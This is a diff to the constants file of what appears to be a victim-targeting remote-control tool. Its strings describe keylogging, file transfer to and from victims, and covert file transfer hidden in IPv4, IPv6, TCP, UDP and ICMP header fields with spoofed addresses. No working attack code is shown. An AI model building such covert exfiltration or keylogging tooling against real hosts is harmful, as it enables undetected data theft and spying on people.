@@ -166,7 +166,9 @@ FILE_TRANSFER_KEYLOG_ERROR = ("[+] FILE TRANSFER ERROR: Cannot transfer file to 
                               "(IP: {}, Port: {}) as they're currently running a keylogger program!")
 TRANSFER_FILE_ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to transfer file to: "
 TRANSFER_FILE_ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer file to: "
-
+GET_IPV6_MSG = "[+] Now acquiring IPv6 Address from victim/client ({}, {})"
+GET_IPV6_ERROR = "[+] TRANSFER FILE ERROR: An error has occurred while getting IPv6 address from target/client!"
+IPV6_OPERATION_SUCCESS_MSG = "[+] OPERATION SUCCESSFUL: Victim/Client IPv6 address and port has been found ({}, {})"
 
 # MENU ITEM 7 - Get File from Victim
 GET_FILE_SIGNAL = "GET FILE"
@@ -183,7 +185,7 @@ PROTOCOL_HEADER_FIELD_MAP = {
     "IPv4": ["Version", "IHL (Internet Header Length)", "DS (Differentiated Services Codepoint)",
              "Explicit Congestion Notification (ECN)", "Total Length", "Identification", "Flags",
              "Fragment Offset", "TTL (Time to Live)", "Protocol", "Header Checksum", "Source Address",
-             "Destination Address", "Options", "Padding"],
+             "Destination Address"],
 
     "IPv6": ["Version", "Traffic Class", "Flow Label", "Payload Length", "Next Header", "Hop Limit",
              "Source Address", "Destination Address"],
@@ -193,7 +195,7 @@ PROTOCOL_HEADER_FIELD_MAP = {
 
     "UDP": ["Source Port", "Destination Port", "Length", "Checksum"],
 
-    "ICMP": ["Type (Type of Message)", "Code", "Checksum", "Rest of the Header (Data)"]
+    "ICMP": ["Type (Type of Message)", "Code", "Checksum", "Identifier", "Sequence Number", "Timestamp"]
 }
 PROTOCOL_CHOICE_PROMPT = "[+] Enter a valid integer between 1 - 5: \n"
 HEADER_CHOICE_PROMPT = "[+] Enter a valid integer between 1 - {}: \n"
@@ -204,15 +206,16 @@ FIELD_SELECTED_MSG = "[+] FIELD SELECTED: {}"
 CHOICES_NOT_FOUND_IN_MAP_ERROR = ("[+] TRANSFER FILE ERROR: The choices chosen are not defined and not present in "
                                   "function mapping!")
 CALL_MAP_FUNCTION_ERROR = "[+] TRANSFER FILE ERROR: Invalid operation while calling mapped function!"
-IPV4_DESTINATION_ADDRESS_ERROR = ("[+] ACTION DENIED: Performing covert file transfer in the {} field for "
-                                  "the {} header will cause the connection to hang!")
-IPV4_DESTINATION_ADDRESS_ERROR_REASON = ("[+] REASON: Data (packets) will be delivered to random spoofed "
-                                         "destination IP addresses")
+DESTINATION_ADDRESS_ERROR = ("[+] ACTION DENIED: Performing covert file transfer in the {} field for "
+                             "the {} header will cause the connection to hang!")
+DESTINATION_ADDRESS_ERROR_REASON = ("[+] REASON: Data (packets) will be delivered to random spoofed "
+                                    "destination IP addresses")
 SOURCE_ADDRESS_FIELD = "Source Address"
 DESTINATION_ADDRESS_FIELD = "Destination Address"
+IPV6 = "IPv6"
 TIMESTAMP = "Timestamp"
-
-
+FIELD_SELECTION_PROMPT = "[+] Please select a field to hide data in {} header for covert file transfer..."
+GET_IPV6_SCRIPT_PATH = "ipv6_getter.py"
 
 # MENU ITEM 9 - Watch File
 START_WATCH_FILE_MSG = "[+] [MENU ITEM 9] - Now Watching File"
